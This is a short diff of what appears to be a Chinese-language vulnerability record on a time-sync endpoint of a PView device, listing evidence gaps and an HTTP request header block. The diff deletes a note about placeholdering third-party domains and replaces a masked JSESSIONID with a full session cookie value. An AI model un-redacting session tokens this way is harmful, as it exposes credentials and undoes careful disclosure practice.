@@ -37,7 +37,7 @@ schema_version: "1"
 以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
 
 - PHP入口带Java会话可能残留/混合栈，需无登录对照，不能据此称匿名
-- 时间同步功能可能修改时间，载荷外部ping无回调结果；第三方域名应占位化
+- 时间同步功能可能修改时间，载荷外部ping无回调结果
 - Content-Length96与短正文不符，HTTP误标Go
 - 缺固件/版本/根因/修复，不能泛化所有PView部署
 
@@ -64,7 +64,7 @@ POST /index.php?r=Third/TimeSyn HTTP/1.1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
 Content-Type: application/x-www-form-urlencoded
 Host: 
-Cookie: JSESSIONID=A******************************A
+Cookie: JSESSIONID=AB3CC11444E566879F70BE78C0C518CA
 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
 Connection: close
 
